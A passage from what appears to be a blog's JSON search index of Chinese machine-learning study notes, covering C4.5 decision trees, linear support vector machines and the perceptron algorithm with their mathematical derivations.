没有考虑过拟合的问题ID3 算法的作者昆兰基于上述不足，对ID3算法做了改进，这就是C4.5算法，也许你会问，为什么不叫ID4，ID5之类的名字呢?那是因为决策树太火爆，他的ID3一出来，别人二次创新，很快 就占了ID4， ID5，所以他另辟蹊径，取名C4.0算法，后来的进化版为C4.5算法。下面我们就来聊下C4.5算法4. 决策树C4.5算法的改进上一节我们讲到ID3算法有四个主要的不足，一是不能处理连续特征，第二个就是用信息增益作为标准容易偏向于取值较多的特征，最后两个是缺失值处理的问和过拟合问题。昆兰在C4.5算法中改进了上述4个问题。对于第一个问题，不能处理连续特征， C4.5的思路是将连续的特征离散化。比如m个样本的连续特征A有m个，从小到大排列为${a_1,a_2,…,a_m}$,则C4.5取相邻两样本值的平均数，一共取得$m-1$个划分点，其中第$i$个划分点$T_i$表示为：$T_i = \\frac{a_i+a_{i+1}}{2}$。对于这$m-1$个点，分别计算以该点作为二元分类点时的信息增益。选择信息增益最大的点作为该连续特征的二元离散分类点。比如取到的增益最大的点为$a_t$,则小于$a_t$的值为类别1，大于$a_t$的值为类别2，这样我们就做到了连续特征的离散化。要注意的是，与离散属性不同的是，如果当前节点为连续属性，则该属性后面还可以参与子节点的产生选择过程。对于第二个问题，信息增益作为标准容易偏向于取值较多的特征的问题。我们引入一个信息增益比的变量$I_R(X,Y)$，它是信息增益和特征熵的比值。表达式如下：\\[I_R(D,A) = \\frac{I(A,D)}{H_A(D)}\\]其中D为样本特征输出的集合，A为样本特征，对于特征熵$H_A(D)$, 表达式如下：\\[H_A(D) = -\\sum\\limits_{i=1}^{n}\\frac{|D_i|}{|D|}log_2\\frac{|D_i|}{|D|}\\]其中n为特征A的类别数，$ D_i$为特征A的第i个取值对应的样本个数。D为样本个数。特征数越多的特征对应的特征熵越大，它作为分母，可以校正信息增益容易偏向于取值较多的特征的问题。对于第三个缺失值处理的问题，主要需要解决的是两个问题，一是在样本某些特征缺失的情况下选择划分的属性，二是选定了划分属性，对于在该属性上缺失特征的样本的处理。对于第一个子问题，对于某一个有缺失特征值的特征A。C4.5的思路是将数据分成两部分，对每个样本设置一个权重（初始可以都为1），然后划分数据，一部分是有特征值A的数据D1，另一部分是没有特征A的数据D2. 然后对于没有缺失特征A的数据集D1来和对应的A特征的各个特征值一起计算加权重后的信息增益比，最后乘上一个系数，这个系数是无特征A缺失的样本加权后所占加权总样本的比例。 比如100个样本，其中40个样本有A特征的值，另外60个特征A特征的值缺失。 那么我们就只用这40个样本来计算信息A特征对应的信息增益比，计算完毕后乘以0.4即可。对于第二个子问题，可以将缺失特征的样本同时划分入所有的子节点，不过将该样本的权重按各个子节点样本的数量比例来分配。比如缺失特征A的样本a之前权重为1，特征A有3个特征值A1,A2,A3。 3个特征值对应的无缺失A特征的样本个数为2,3,4.则a同时划分入A1，A2，A3。对应权重调节为2/9,3/9, 4/9。对于第4个问题，C4.5引入了正则化系数进行初步的剪枝。具体方法这里不讨论。下篇讲CART的时候会详细讨论剪枝的思路。除了上面的4点，C4.5和ID的思路区别不大。5. 决策树C4.5算法的不足与思考C4.5虽然改进或者改善了ID3算法的几个主要的问题，仍然有优化的空间。1)由于决策树算法非常容易过拟合，因此对于生成的决策树必须要进行剪枝。剪枝的算法有非常多，C4.5的剪枝方法有优化的空间。思路主要是两种，一种是预剪枝，即在生成决策树的时候就决定是否剪枝。另一个是后剪枝，即先生成决策树，再通过交叉验证来剪枝。后面在下篇讲CART树的时候我们会专门讲决策树的减枝思路，主要采用的是后剪枝加上交叉验证选择最合适的决策树。2)C4.5生成的是多叉树，即一个父节点可以有多个节点。很多时候，在计算机中二叉树模型会比多叉树运算效率高。如果采用二叉树，可以提高效率。3)C4.5只能用于分类，如果能将决策树用于回归的话可以扩大它的使用范围。4)C4.5由于使用了熵模型，里面有大量的耗时的对数运算,如果是连续值还有大量的排序运算。如果能够加以模型简化可以减少运算强度但又不牺牲太多准确性的话，那就更好了。这4个问题在CART树里面部分加以了改进。所以目前如果不考虑集成学习话，在普通的决策树算法里，CART算法算是比较优的算法了。scikit-learn的决策树使用的也是CART算法。在下篇里我们会重点聊下CART算法的主要改进思路，上篇就到这里。下篇请看决策树算法原理(下)。参考文献：https://www.cnblogs.com/pinard/p/6050306.html" }, { "title": "支持向量机（一）线性支持向量机", "url": "/posts/%E6%94%AF%E6%8C%81%E5%90%91%E9%87%8F%E6%9C%BA-%E4%B8%80-%E7%BA%BF%E6%80%A7%E6%94%AF%E6%8C%81%E5%90%91%E9%87%8F%E6%9C%BA/", "categories": "学习笔记", "tags": "机器学习", "date": "2018-08-14 00:00:00 +0800", "snippet": "支持向量机(Support Vecor Machine,以下简称SVM)虽然诞生只有短短的二十多年，但是自一诞生便由于它良好的分类性能席卷了机器学习领域，并牢牢压制了神经网络领域好多年。如果不考虑集成学习的算法，不考虑特定的训练数据集，在分类算法中的表现SVM说是排第一估计是没有什么异议的。SVM是一个二元分类算法，线性分类和非线性分类都支持。经过演进，现在也可以支持多元分类，同时经过扩展，也能应用于回归问题。本系列文章就对SVM的原理做一个总结。本篇的重点是SVM用于线性分类时模型和损失函数优化的一个总结。1. 回顾感知机模型在感知机原理小结中，我们讲到了感知机的分类原理，感知机的模型就是尝试找到一条直线，能够把二元数据隔离开。放到三维空间或者更高维的空间，感知机的模型就是尝试找到一个超平面，能够把所有的二元类别隔离开。对于这个分离的超平面，我们定义$w^Tx + b = 0$，如下图。在超平面$w^Tx + b = 0$上方的我们定义为$y=1$,在超平面$w^Tx + b = 0$下方的我们定义为$y=-1$。可以看出满足这个条件的超平面并不止一个。那么我们可能会尝试思考，这么多的可以分类的超平面，哪个是最好的呢？或者说哪个是泛化能力最强的呢?接着我们看感知机模型的损失函数优化，它的思想是让所有误分类的点(定义为M)到超平面的距离和最小，即最小化下式：\\[\\sum\\limits_{x_i \\in M}- y^{(i)}(w^Tx^{(i)} +b)\\big / ||w||_2\\]当$w$和$b$成比例的增加，比如,当分子的$w$和$b$扩大N倍时，分母的L2范数也会扩大N倍。也就是说，分子和分母有固定的倍数关系。那么我们可以固定分子或者分母为1，然后求另一个即分子自己或者分母的倒数的最小化作为损失函数，这样可以简化我们的损失函数。在感知机模型中，我们采用的是保留分子，固定分母$||w||_2 = 1$,即最终感知机模型的损失函数为：\\[\\sum\\limits_{x_i \\in M}- y^{(i)}(w^Tx^{(i)} +b)\\]如果我们不是固定分母，改为固定分子，作为分类模型有没有改进呢？这些问题在我们引入SVM后会详细解释。2.函数间隔与几何间隔在正式介绍SVM的模型和损失函数之前，我们还需要先了解下函数间隔和几何间隔的知识。在分离超平面固定为$w^Tx + b = 0$的时候，$|w^Tx + b |$表示点x到超平面的距离。通过观察$w^Tx + b$和$y$是否同号，我们判断分类是否正确，这些知识我们在感知机模型里都有讲到。这里我们引入函数间隔的概念，定义函数间隔$\\gamma^{‘}$为：\\[\\gamma^{&#39;} = y(w^Tx + b)\\]可以看到，它就是感知机模型里面的误分类点到超平面距离的分子。对于训练集中m个样本点对应的m个函数间隔的最小值，就是整个训练集的函数间隔。函数间隔并不能正常反应点到超平面的距离，在感知机模型里我们也提到，当分子成比例的增长时，分母也是成倍增长。为了统一度量，我们需要对法向量$w$加上约束条件，这样我们就得到了几何间隔$\\gamma$,定义为：\\[\\gamma = \\frac{y(w^Tx + b)}{||w||_2} = \\frac{\\gamma^{&#39;}}{||w||_2}\\]几何间隔才是点到超平面的真正距离，感知机模型里用到的距离就是几何距离。3. 支持向量在感知机模型中，我们可以找到多个可以分类的超平面将数据分开，并且优化时希望所有的点都离超平面远。但是实际上离超平面很远的点已经被正确分类，我们让它离超平面更远并没有意义。反而我们最关心是那些离超平面很近的点，这些点很容易被误分类。如果我们可以让离超平面比较近的点尽可能的远离超平面，那么我们的分类效果会好有一些。SVM的思想起源正起于此。如下图所示，分离超平面为$wTx+b=0wTx+b=0$，如果所有的样本不光可以被超平面分开，还和超平面保持一定的函数距离（下图函数距离为1），那么这样的分类超平面是比感知机的分类超平面优的。可以证明，这样的超平面只有一个。和超平面平行的保持一定的函数距离的这两个超平面对应的向量，我们定义为支持向量，如下图虚线所示。支持向量到超平面的距离为$1/||w||_2$,两个支持向量之间的距离为$2/||w||_2$。4. SVM模型目标函数与优化SVM的模型是让所有点到超平面的距离大于一定的距离，也就是所有的分类点要在各自类别的支持向量两边。用数学式子表示为：\\[max \\;\\; \\gamma = \\frac{y(w^Tx + b)}{||w||_2} \\;\\; s.t \\;\\; y_i(\\frac{w^Tx_i + b}{||w||_2}) \\geq \\gamma (i =1,2,...m)\\]\\[max \\;\\; \\frac{\\gamma^{&#39;}}{||w||} \\;\\; s.t \\;\\; y_i(w^Tx_i + b) = \\gamma^{&#39;(i)} \\geq \\gamma^{&#39;} (i =1,2,...m)\\]一般我们都取函数间隔\\(\\gamma^{&#39;}\\)为1，这样我们的优化函数定义为：\\[max \\;\\; \\frac{1}{||w||_2} \\;\\; s.t \\;\\; y_i(w^Tx_i + b) \\geq 1 (i =1,2,...m)\\]也就是说，我们要在约束条件\\(y_i(w^Tx_i + b) \\geq 1 (i =1,2,...m)\\)下，最大化$\\frac{1}{||w||_2}$。可以看出，这个感知机的优化方式不同，感知机是固定分母优化分子，而SVM是固定分子优化分母，同时加上了支持向量的限制。由于$\\frac{1}{||w||_2}$的最大化等同于$\\frac{1}{2}||w||_2^2$的最小化。这样SVM的优化函数等价于：\\[min \\;\\; \\frac{1}{2}||w||_2^2 \\;\\; s.t \\;\\; y_i(w^Tx_i + b) \\geq 1 (i =1,2,...m)\\]由于目标函数$\\frac{1}{2}||w||_2^2$是凸函数，同时约束条件不等式是仿射的，根据凸优化理论，我们可以通过拉格朗日函数将我们的优化目标转化为无约束的优化函数，这和最大熵模型原理小结中讲到了目标函数的优化方法一样。具体的，优化函数转化为：\\[L(w,b,\\alpha) = \\frac{1}{2}||w||_2^2 - \\sum\\limits_{i=1}^{m}\\alpha_i[y_i(w^Tx_i + b) - 1] \\; 满足\\alpha_i \\geq 0\\]由于引入了朗格朗日乘子，我们的优化目标变成：\\[\\underbrace{min}_{w,b}\\; \\underbrace{max}_{\\alpha_i \\geq 0} L(w,b,\\alpha)\\]和最大熵模型一样的，我们的这个优化函数满足KKT条件，也就是说，我们可以通过拉格朗日对偶将我们的优化问题转化为等价的对偶问题来求解。如果对凸优化和拉格朗日对偶不熟悉，建议阅读鲍德的《凸优化》。也就是说，现在我们要求的是：\\[\\underbrace{max}_{\\alpha_i \\geq 0} \\;\\underbrace{min}_{w,b}\\;  L(w,b,\\alpha)\\]从上式中，我们可以先求优化函数对于$w$和$b$的极小值。接着再求拉格朗日乘子$\\alpha$的极大值。首先我们来求$w$和$b$的极小值，即$\\underbrace{min}_{w,b}\\;  L(w,b,\\alpha)$。这个极值我们可以通过对$w$和$b$分别求偏导数得到：\\[\\frac{\\partial L}{\\partial w} = 0 \\;\\Rightarrow w = \\sum\\limits_{i=1}^{m}\\alpha_iy_ix_i\\]\\[\\frac{\\partial L}{\\partial b} = 0 \\;\\Rightarrow \\sum\\limits_{i=1}^{m}\\alpha_iy_i = 0\\]从上两式子可以看出，我们已经求得了$w$和$\\alpha$的关系，只要我们后面接着能够求出优化函数极大化对应的$\\alpha$，就可以求出我们的$w$了，至于$b$，由于上两式已经没有$b$，所以最后的$b$可以有多个。好了，既然我们已经求出$w$和$\\alpha$的关系，就可以带入优化函数$L(w,b,\\alpha)$消去$w$了。我们定义:\\[\\psi(\\alpha) = \\underbrace{min}_{w,b}\\; L(w,b,\\alpha)\\]现在我们来看将$w$替换为$\\alpha$的表达式以后的优化函数$\\psi(\\alpha)$的表达式：\\[\\]\\[\\begin{align} \\psi(\\alpha) &amp;amp; = \\frac{1}{2}||w||_2^2 - \\sum\\limits_{i=1}^{m}\\alpha_i[y_i(w^Tx_i + b) - 1] \\\\&amp;amp; = \\frac{1}{2}w^Tw-\\sum\\limits_{i=1}^{m}\\alpha_iy_iw^Tx_i - \\sum\\limits_{i=1}^{m}\\alpha_iy_ib + \\sum\\limits_{i=1}^{m}\\alpha_i \\\\&amp;amp; = \\frac{1}{2}w^T\\sum\\limits_{i=1}^{m}\\alpha_iy_ix_i -\\sum\\limits_{i=1}^{m}\\alpha_iy_iw^Tx_i - \\sum\\limits_{i=1}^{m}\\alpha_iy_ib + \\sum\\limits_{i=1}^{m}\\alpha_i \\\\&amp;amp; = \\frac{1}{2}w^T\\sum\\limits_{i=1}^{m}\\alpha_iy_ix_i - w^T\\sum\\limits_{i=1}^{m}\\alpha_iy_ix_i - \\sum\\limits_{i=1}^{m}\\alpha_iy_ib + \\sum\\limits_{i=1}^{m}\\alpha_i \\\\&amp;amp; = - \\frac{1}{2}w^T\\sum\\limits_{i=1}^{m}\\alpha_iy_ix_i - \\sum\\limits_{i=1}^{m}\\alpha_iy_ib + \\sum\\limits_{i=1}^{m}\\alpha_i \\\\&amp;amp; = - \\frac{1}{2}w^T\\sum\\limits_{i=1}^{m}\\alpha_iy_ix_i - b\\sum\\limits_{i=1}^{m}\\alpha_iy_i + \\sum\\limits_{i=1}^{m}\\alpha_i \\\\&amp;amp; = -\\frac{1}{2}(\\sum\\limits_{i=1}^{m}\\alpha_iy_ix_i)^T(\\sum\\limits_{i=1}^{m}\\alpha_iy_ix_i) - b\\sum\\limits_{i=1}^{m}\\alpha_iy_i + \\sum\\limits_{i=1}^{m}\\alpha_i \\\\&amp;amp; = -\\frac{1}{2}\\sum\\limits_{i=1}^{m}\\alpha_iy_ix_i^T\\sum\\limits_{i=1}^{m}\\alpha_iy_ix_i - b\\sum\\limits_{i=1}^{m}\\alpha_iy_i + \\sum\\limits_{i=1}^{m}\\alpha_i \\\\&amp;amp; = -\\frac{1}{2}\\sum\\limits_{i=1}^{m}\\alpha_iy_ix_i^T\\sum\\limits_{i=1}^{m}\\alpha_iy_ix_i + \\sum\\limits_{i=1}^{m}\\alpha_i \\\\&amp;amp; = -\\frac{1}{2}\\sum\\limits_{i=1,j=1}^{m}\\alpha_iy_ix_i^T\\alpha_jy_jx_j + \\sum\\limits_{i=1}^{m}\\alpha_i \\\\&amp;amp; = \\sum\\limits_{i=1}^{m}\\alpha_i - \\frac{1}{2}\\sum\\limits_{i=1,j=1}^{m}\\alpha_i\\alpha_jy_iy_jx_i^Tx_j \\end{align}\\]其中，(1)式到(2)式用到了范数的定义 $||w||_2^2 =w^Tw$，(2)式到(3)式用到了上面的$w = \\sum\\limits_{i=1}^{m}\\alpha_iy_ix_i$， (3)式到(4)式把和样本无关的$w^T$提前，(4)式到(5)式合并了同类项，(5)式到(6)式把和样本无关的b提前，(6)式到(7)式继续用到$w = \\sum\\limits_{i=1}^{m}\\alpha_iy_ix_i$，（7）式到(8)式用到了向量的转置。由于常量的转置是其本身，所有只有向量$x_i$被转置，（8）式到(9)式用到了上面的$\\sum\\limits_{i=1}^{m}\\alpha_iy_i = 0$，（9）式到(10)式使用了(a+b+c+…)(a+b+c+…)=aa+ab+ac+ba+bb+bc+…的乘法运算法则，（10）式到(11)式仅仅是位置的调整。从上面可以看出，通过对$w$,$b$极小化以后，我们的优化函数$\\psi(\\alpha)$仅仅只有$\\alpha$向量做参数。只要我们能够极大化$\\psi(\\alpha)$，就可以求出此时对应的$\\alpha$，进而求出$w$,$b$.对$\\psi(\\alpha)$求极大化的数学表达式如下:\\[\\underbrace{max}_{\\alpha} -\\frac{1}{2}\\sum\\limits_{i=1}^{m}\\sum\\limits_{j=1}^{m}\\alpha_i\\alpha_jy_iy_j(x_i \\bullet x_j) + \\sum\\limits_{i=1}^{m} \\alpha_i\\]\\[s.t. \\; \\sum\\limits_{i=1}^{m}\\alpha_iy_i = 0\\]\\[\\alpha_i \\geq 0  \\; i=1,2,...m\\]可以去掉负号，即为等价的极小化问题如下：\\[\\underbrace{min}_{\\alpha} \\frac{1}{2}\\sum\\limits_{i=1}^{m}\\sum\\limits_{j=1}^{m}\\alpha_i\\alpha_jy_iy_j(x_i \\bullet x_j) - \\sum\\limits_{i=1}^{m} \\alpha_i\\]\\[s.t. \\; \\sum\\limits_{i=1}^{m}\\alpha_iy_i = 0\\]\\[\\alpha_i \\geq 0 \\; i=1,2,...m\\]只要我们可以求出上式极小化时对应的$\\alpha$向量就可以求出$w$和$b$了。具体怎么极小化上式得到对应的$\\alpha$，一般需要用到SMO算法，这个算法比较复杂，我们后面会专门来讲。在这里，我们假设通过SMO算法，我们得到了对应的$\\alpha$的值$\\alpha^{*}$。那么我们根据$w = \\sum\\limits_{i=1}^{m}\\alpha_iy_ix_i$，可以求出对应的$w$的值\\[w^{*} = \\sum\\limits_{i=1}^{m}\\alpha_i^{*}y_ix_i\\]求$b$则稍微麻烦一点。注意到，对于任意支持向量$(x_x, y_s)$，都有\\[y_s(w^Tx_s+b) = y_s(\\sum\\limits_{i=1}^{m}\\alpha_iy_ix_i^Tx_s+b) = 1\\]假设我们有S个支持向量，则对应我们求出S个$b^{*}$,理论上这些$b^{*}$都可以作为最终的结果， 但是我们一般采用一种更健壮的办法，即求出所有支持向量所对应的$b_s^{*}$，然后将其平均值作为最后的结果。注意到对于严格线性可分的SVM，$b$的值是有唯一解的，也就是这里求出的所有$b^{*}$都是一样的，这里我们仍然这么写是为了和后面加入软间隔后的SVM的算法描述一致。怎么得到支持向量呢？根据KKT条件中的对偶互补条件$\\alpha_{i}^{*}(y_i(w^Tx_i + b) - 1) = 0$，如果$\\alpha_i&amp;gt;0$则有$y_i(w^Tx_i + b) =1$ 即点在支持向量上，否则如果$\\alpha_i=0$则有$y_i(w^Tx_i + b) \\geq 1$，即样本在支持向量上或者已经被正确分类。5. 线性可分SVM的算法过程这里我们对线性可分SVM的算法过程做一个总结。输入是线性可分的m个样本${(x_1,y_1), (x_2,y_2), …, (x_m,y_m),}$,其中$x$为n维特征向量。$y$为二元输出，值为1，或者-1.输出是分离超平面的参数$w^{*}$和$b^{*}$和分类决策函数。算法过程如下：1.构造约束优化问题\\[\\underbrace{min}_{\\alpha} \\frac{1}{2}\\sum\\limits_{i=1}^{m}\\sum\\limits_{j=1}^{m}\\alpha_i\\alpha_jy_iy_j(x_i \\bullet x_j) - \\sum\\limits_{i=1}^{m} \\alpha_i\\]\\[s.t. \\; \\sum\\limits_{i=1}^{m}\\alpha_iy_i = 0\\]\\[\\alpha_i \\geq 0  \\; i=1,2,...m\\]2.用SMO算法求出上式最小时对应的$\\alpha$向量的值$\\alpha^{*}$向量.3.计算$w^{*} = \\sum\\limits_{i=1}^{m}\\alpha_i^{*}y_ix_i$4.找出所有的S个支持向量,即满足$\\alpha_s &amp;gt; 0$对应的样本$(x_s,y_s)$，通过$ y_s(\\sum\\limits_{i=1}^{m}\\alpha_iy_ix_i^Tx_s+b) = 1$，计算出每个支持向量$(x_x, y_s)$对应的$b_s^{*}$,计算出这些$b_s^{*} = y_s - \\sum\\limits_{i=1}^{m}\\alpha_iy_ix_i^Tx_s$. 所有的$b_s^{*}$对应的平均值即为最终的$b^{*} = \\frac{1}{S}\\sum\\limits_{i=1}^{S}b_s^{*}$这样最终的分类超平面为：$w^{*} \\bullet x + b^{*} = 0$，最终的分类决策函数为：$f(x) = sign(w^{*} \\bullet x + b^{*})$6. 总结线性可分SVM的学习方法对于非线性的数据集是没有办法使用的， 有时候不能线性可分的原因是线性数据集里面多了少量的异常点，由于这些异常点导致了数据集不能线性可分， 那么怎么可以处理这些异常点使数据集依然可以用线性可分的思想呢？ 我们在下一节的线性SVM的软间隔最大化里继续讲。参考文献：https://www.cnblogs.com/pinard/p/6097604.html" }, { "title": "感知机原理小结", "url": "/posts/%E6%84%9F%E7%9F%A5%E6%9C%BA%E5%8E%9F%E7%90%86%E5%B0%8F%E7%BB%93/", "categories": "学习笔记", "tags": "机器学习", "date": "2018-08-13 00:00:00 +0800", "snippet": "感知机可以说是最古老的分类方法之一了，在1957年就已经提出。今天看来它的分类模型在大多数时候泛化能力不强，但是它的原理却值得好好研究。因为研究透了感知机模型，学习支持向量机的话会降低不少难度。同时如果研究透了感知机模型，再学习神经网络，深度学习，也是一个很好的起点。这里对感知机的原理做一个小结。1. 感知机模型感知机的思想很简单，比如我们在一个平台上有很多的男孩女孩，感知机的模型就是尝试找到一条直线，能够把所有的男孩和女孩隔离开。放到三维空间或者更高维的空间，感知机的模型就是尝试找到一个超平面，能够把所有的二元类别隔离开。当然你会问，如果我们找不到这么一条直线的话怎么办？找不到的话那就意味着类别线性不可分，也就意味着感知机模型不适合你的数据的分类。使用感知机一个最大的前提，就是数据是线性可分的。这严重限制了感知机的使用场景。它的分类竞争对手在面对不可分的情况时，比如支持向量机可以通过核技巧来让数据在高维可分，神经网络可以通过激活函数和增加隐藏层来让数据可分。用数学的语言来说，如果我们有m个样本，每个样本对应于n维特征和一个二元类别输出，如下：\\[(x_1^{(1)}, x_2^{(1)}, ...x_n^{(1)}, y_1), (x_1^{(2)}, x_2^{(2)}, ...x_n^{(2)},y_2), ... (x_1^{(m)}, x_2^{(m)}, ...x_n^{(m)}, y_m)\\]我们的目标是找到这样一个超平面，即：\\[\\theta_0 + \\theta_{1}x_1 + ... + \\theta_{n}x_{n} = 0 \\]让其中一种类别的样本都满足$\\theta_0 + \\theta_{1}x_1 + … + \\theta_{n}x_{n} &amp;gt; 0 $，让另一种类别的样本都满足$\\theta_0 + \\theta_{1}x_1 + … + \\theta_{n}x_{n} &amp;lt; 0$ ，从而得到线性可分。如果数据线性可分，这样的超平面一般都不是唯一的，也就是说感知机模型可以有多个解。为了简化这个超平面的写法，我们增加一个特征$x_0 = 1$ ，这样超平面为$\\sum\\limits_{i=0}^{n}\\theta_{i}x_{i} = 0$。进一步用向量来表示为： $\\theta \\bullet x = 0$,其中$\\theta$为(n+1)x1的向量，$x$为(n+1)x1的向量, $\\bullet$为内积，后面我们都用向量来表示超平面。而感知机的模型可以定义为：$y = sign(\\theta \\bullet x)$ 其中：\\[sign(x)= \\begin{cases} -1&amp;amp; {x&amp;lt;0}\\\\ 1&amp;amp; {x\\geq 0} \\end{cases}\\]2. 感知机模型损失函数为了后面便于定义损失函数，我们将满足$\\theta \\bullet x &amp;gt; 0$的样本类别输出值取为1，满足$\\theta \\bullet x &amp;lt; 0$的样本类别输出值取为-1，  这样取y的值有一个好处，就是方便定义损失函数。因为正确分类的样本满足 $y\\theta \\bullet x &amp;gt; 0$，而错误分类的样本满足 $y\\theta \\bullet x &amp;lt; 0$。我们损失函数的优化目标，就是期望使误分类的所有样本，到超平面的距离之和最小。由于$y\\theta \\bullet x &amp;lt; 0$，所以对于每一个误分类的样本i ，到超平面的距离是\\[y^{(i)}\\theta \\bullet x^{(i)}\\big / ||\\theta||_2\\]其中$||\\theta||_2$为L2范数。我们假设所有误分类的点的集合为M，则所有误分类的样本到超平面的距离之和为：\\[\\sum\\limits_{x_i \\in M}y^{(i)}\\theta \\bullet x^{(i)}\\big / ||\\theta||_2\\]这样我们就得到了初步的感知机模型的损失函数。我们研究可以发现，分子和分母都含有$\\theta$,当分子的$\\theta$扩大N倍时，分母的L2范数也会扩大N倍。也就是说，分子和分母有固定的倍数关系。那么我们可以固定分母为1，求分子的最小化；或者固定分子为1，求分母的倒数的最大化作为损失函数，这样可以简化我们的损失函数。在感知机模型中，我们采用的是保留分子，即最终感知机模型的损失函数简化为：\\[J(\\theta) = - \\sum\\limits_{x_i \\in M}y^{(i)}\\theta \\bullet x^{(i)}\\]题外话，如果大家了解过支持向量机，就发现支持向量机采用的是固定分子为1，然后求$1/ ||\\theta||_2$的最大化。采用不同的损失函数主要与它的后面的优化算法有关系。3. 感知机模型损失函数的优化方法上一节我们讲到了感知机的损失函数：$J(\\theta) = - \\sum\\limits_{x_i \\in M}y^{(i)}\\theta \\bullet x^{(i)}$，其中M是所有误分类的点的集合。这是一个凸函数，可以用梯度下降法或者拟牛顿法来解决，常用的是梯度下降法。但是用普通的基于所有样本的梯度和的均值的批量梯度下降法（BGD）是行不通的，原因在于我们的损失函数里面有限定，只有误分类的M集合里面的样本才能参与损失函数的优化。所以我们不能用最普通的批量梯度下降,只能采用随机梯度下降（SGD）或者小批量梯度下降（MBGD）。感知机模型选择的是采用随机梯度下降，这意味着我们每次仅仅需要使用一个误分类的点来更新梯度。损失函数基于$\\theta$向量的的偏导数为：\\[\\frac{\\partial}{\\partial \\theta}J(\\theta) = - \\sum\\limits_{x_i \\in M}y^{(i)}x^{(i)}\\]$\\theta$的梯度下降迭代公式应该为：\\[\\theta = \\theta + \\alpha\\sum\\limits_{x_i \\in M}y^{(i)}x^{(i)}\\]由于我们采用随机梯度下降，所以每次仅仅采用一个误分类的样本来计算梯度，假设采用第i个样本来更新梯度，则简化后的$\\theta$向量的梯度下降迭代公式为：\\[　\\theta = \\theta + \\alpha y^{(i)}x^{(i)}\\]其中$\\alpha$为步长，$y^{(i)}$为样本输出1或者-1，$x^{(i)}$为(n+1)x1的向量。4. 感知机模型的算法前两节我们谈到了感知机模型，对应的损失函数和优化方法。这里我们就对感知机模型基于随机梯度下降来求\\theta向量的算法做一个总结。算法的输入为m个样本，每个样本对应于n维特征和一个二元类别输出1或者-1，如下：\\[(x_1^{(1)}, x_2^{(1)}, ...x_n^{(1)}, y_1), (x_1^{(2)}, x_2^{(2)}, ...x_n^{(2)},y_2), ... (x_1^{(m)}, x_2^{(m)}, ...x_n^{(m)}, y_m)\\]输出为分离超平面的模型系数$\\theta$向量算法的执行步骤如下： 定义所有$x_0$为1。选择$\\theta$向量的初值和步长$\\alpha$的初值。可以将$\\theta$向量置为0向量，步长设置为1。要注意的是，由于感知机的解不唯一，使用的这两个初值会影响$\\theta$向量的最终迭代结果。 在训练集里面选择一个误分类的点$(x_1^{(i)}, x_2^{(i)}, …x_n^{(i)}, y_i)$, 用向量表示即$(x^{(i)}, y^{(i)})$，这个点应该满足：$y^{(i)}\\theta \\bullet x^{(i)} \\leq 0$ 对$\\theta$向量进行一次随机梯度下降的迭代：$\\theta = \\theta  + \\alpha y^{(i)}x^{(i)}$ 检查训练集里是否还有误分类的点，如果没有，算法结束，此时的$\\theta$向量即为最终结果。如果有，继续第2步。5. 感知机模型的算法对偶形式上一节的感知机模型的算法形式我们一般称为感知机模型的算法原始形式。对偶形式是对算法执行速度的优化。具体是怎么优化的呢？通过上一节感知机模型的算法原始形式$\\theta = \\theta + \\alpha y^{(i)}x^{(i)}$可以看出，我们每次梯度的迭代都是选择的一个样本来更新$\\theta$向量。最终经过若干次的迭代得到最终的结果。对于从来都没有误分类过的样本，他被选择参与$\\theta$迭代的次数是0，对于被多次误分类而更新的样本j，它参与$\\theta$迭代的次数我们设置为$m_j$。如果令$\\theta$向量初始值为0向量， 这样我们的$\\theta$向量的表达式可以写为：\\[\\theta = \\alpha \\sum\\limits_{j=1}^{m}m_jy^{(j)}x^{(j)}\\]其中$m_j$为样本$(x^{(j)}, y^{(j)}$)在随机梯度下降到当前的这一步之前因误分类而更新的次数。每一个样本$(x^{(j)}, y^{(j)})$的$m_j$的初始值为0，每当此样本在某一次梯度下降迭代中因误分类而更新时，$m_j$的值加1。由于步长$\\alpha$为常量，我们令$\\beta_j = \\alpha m_j$,这样$\\theta$向量的表达式为:\\[\\theta = \\sum\\limits_{j=1}^{m}\\beta_j y^{(j)}x^{(j)}\\]在每一步判断误分类条件的地方，我们用 $y^{(i)}\\theta \\bullet x^{(i)} &amp;lt; 0 $的变种 $y^{(i)}\\sum\\limits_{j=1}^{m}\\beta_j y^{(j)}x^{(j)}\\bullet x^{(i)} &amp;lt; 0 $来判断误分类。注意到这个判断误分类的形式里面是计算两个样本$x^{(i)}$和$x^{(j)}$的内积，而且这个内积计算的结果在下面的迭代次数中可以重用。如果我们事先用矩阵运算计算出所有的样本之间的内积，那么在算法运行时， 仅仅一次的矩阵内积运算比多次的循环计算省时。 计算量最大的判断误分类这儿就省下了很多的时间，这也是对偶形式的感知机模型比原始形式优的原因。样本的内积矩阵称为Gram矩阵，它是一个对称矩阵，记为 $G = [x^{(i)} \\bullet x^{(j)} ]$这里给出感知机模型的算法对偶形式的内容。算法的输入为m个样本，每个样本对应于n维特征和一个二元类别输出1或者-1，如下：\\[(x_1^{(1)}, x_2^{(1)}, ...x_n^{(1)}, y_1), (x_1^{(2)}, x_2^{(2)}, ...x_n^{(2)},y_2), ... (x_1^{(m)}, x_2^{(m)}, ...x_n^{(m)}, y_m)\\]输出为分离超平面的模型系数$\\theta$向量算法的执行步骤如下： 定义所有$x_0$为1，步长$\\alpha$初值，设置$\\beta$的初值0。可以将$\\alpha$设置为1。要注意的是，由于感知机的解不唯一，使用的步长初值会影响$\\theta$向量的最终迭代结果。 计算所有样本内积形成的Gram矩阵G。 在训练集里面选择一个误分类的点$(x^{(i)}, y^{(i)})$，这个点应该满足： $y^{(i)}\\sum\\limits_{j=1}^{m}\\beta_j y^{(j)}x^{(j)}\\bullet x^{(i)} \\leq 0$，  在检查是否满足时可以通过查询Gram矩阵的$g_{ij} $的值来快速计算是否小于0。 对$\\beta$向量的第$i$个分量进行一次更新：$\\beta_i= \\beta_i+ \\alpha$ 检查训练集里是否还有误分类的点，如果没有，算法结束，此时的$\\theta$向量最终结果为下式。如果有，继续第2步。\\[\\theta = \\sum\\limits_{j=1}^{m}\\beta_j y^{(j)}x^{(j)} \\] 其中$\\beta_j$ 为$\\beta$向量的第j个分量。 6. 小结感知机算法是一个简单易懂的算法，自己编程实现也不太难。前面提到它是很多算法的鼻祖，比如支持向量机算法，神经网络与深度学习。因此虽然它现在已经不是一个在实践中广泛运用的算法，还是值得好好的去研究一下。感知机算法对偶形式为什么在实际运用中比原始形式快，也值得好好去体会。" }, { "title": "交叉验证（cross validation）原理小结", "url": 